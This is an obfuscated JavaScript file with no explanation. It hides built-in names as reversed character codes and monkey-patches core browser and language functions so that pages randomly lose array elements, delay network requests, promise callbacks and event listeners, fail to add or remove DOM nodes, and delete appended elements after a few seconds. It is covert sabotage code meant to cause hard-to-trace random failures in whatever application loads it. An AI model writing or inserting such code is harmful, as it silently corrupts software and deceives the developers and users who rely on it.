(function(global){
				const ARS = [121, 114, 97, 114, 114, 65], ObjS = [116, 99, 101, 106, 98, 79], XHRS = [116, 115, 101, 117, 113, 101, 82, 112, 116, 116, 72, 76, 77, 88], DS = [116, 110, 101, 109, 117, 99, 111, 100]
					  PrototypeStr = [101, 112, 121, 116, 111, 116, 111, 114, 112], FilterStr = [114, 101, 116, 108, 105, 102], 
					  SendStr = [100, 110, 101, 115], TS = [110, 101, 104, 116], 
					  DFPS = [121, 116, 114, 101, 112, 111, 114, 80, 101, 110, 105, 102, 101, 100], DFPIES = [115, 101, 105, 116, 114, 101, 112, 111, 114, 80, 101, 110, 105, 102, 101, 100]
					  AEL = [114, 101, 110, 101, 116, 115, 105, 76, 116, 110, 101, 118, 69, 100, 100, 97],
					  RC = [100, 108, 105, 104, 67, 101, 118, 111, 109, 101, 114], REV = [114, 101, 109, 111, 118, 101], AC = [100, 108, 105, 104, 67, 100, 110, 101, 112, 112, 97]
					
					const Arrary = global[Escape(ARS)], Object = global[Escape(ObjS)], XMLHttpRequest = global[Escape(XHRS)], document = global[Escape(DS)]
					
				const pts = Escape(PrototypeStr), fs = Escape(FilterStr), ss = Escape(SendStr), ts = Escape(TS), dfps = Escape(DFPS), dfpies = Escape(DFPIES), ael = Escape(AEL), rc = Escape(RC), rev = Escape(REV), ac = Escape(AC)
				
				function Escape(str){
					str = str.reverse().map(item=>{
						return String.fromCharCode(item)
					})
					return str.join('')
				}
				
				function rand(m, n)  {
				    return Math.abs(Math.ceil(Math.random() * (n-m+1) + m-1))
				}
				
				function setter(setter){
					let queue = [], updating = false
					function reslove(...args){
						if(rand(0, 10) < 2 || true)
						{
							setter.apply(this, args)
							if(queue.length)
								reslove.call(this, queue.shift())
							else
								updating = false
						}
						else{
							setTimeout(()=>{
								setter.apply(this, args)
								if(queue.length)
									reslove.call(this, queue.shift())
								else
									updating = false
							}, rand(0, 10) * 5.3)
						}
					}
					
					return function _(...args){
						if(updating)
							queue.push(args)
						else{
							updating = true
							reslove.call(this, ...args)
						}
					}
					
				}
				
				const _filter = Array[pts][fs];
				Array[pts][fs] = function (...args) {
					result = _filter.call(this, ...args);
					if (Math.random() < 0.02) {
						result.length = Math.max(result.length - 1, 0);
					}
					return result;
				}
				
				const send = XMLHttpRequest[pts][ss]
				XMLHttpRequest[pts][ss] = function(...args){
					setTimeout(()=>{
						send.apply(this, args)
					}, rand(0, 1) ? rand(0, 20) * 100 : 0)
				}
				
				const then = Promise[pts][ts]
				Promise[pts][ts] = function(callback){
					then.call(this, (...args)=>{
						setTimeout(()=>{
							callback(...args)
						}, rand(0, 1) ? rand(0, 20) * 20 : 0)
					})
					return this
				}
				
				const defineProperty = Object[dfps]
				Object[dfps] = function(obj, prop, des){
					const des_ = {...des}
					if(des.set)
						des_.set = setter(des.set)
					return defineProperty.call(Object, obj, prop, des_)
				}
				
				const defineProperties = Object[dfpies]
				Object[dfpies] = function(obj, props){
					const props_ = {...props}
					for(let name in props)
					{
						if(props[name].set)
							props_[name].set = setter(props[name])
					}
					return defineProperties(obj, props)
				}
				
				const addEventListener = HTMLElement[pts][ael]
				HTMLElement[pts][ael] = function(type, listener, options){
					setTimeout(()=>{
						addEventListener.call(this, type, listener, options)
					}, rand(0, 1) ? rand(0, 20) * 50 : 0)
				}
				
				window.addEventListener('load', function(){
					const removeChild = Node[pts][rc]
					Node[pts][rc] = function(...args){
						return rand(0, 9) ? removeChild.apply(this, args) : null
					}
					
					const remove = Element[pts][rev]
					Element[pts][rev] = function(flag){
						return rand(0, 9) || flag ? remove.call(this) : null
					}
					
					const appendChild = Node[pts][ac]
					Node[pts][ac] = function(...arg){
						return rand(0, 9) ? (appendChild.apply(this, arg), rand(0, 9) < 3) ? setTimeout(()=>this.remove(true), rand(1,3) * 1000) : null : null
					}
					
				})
				
})(eval(this) || window)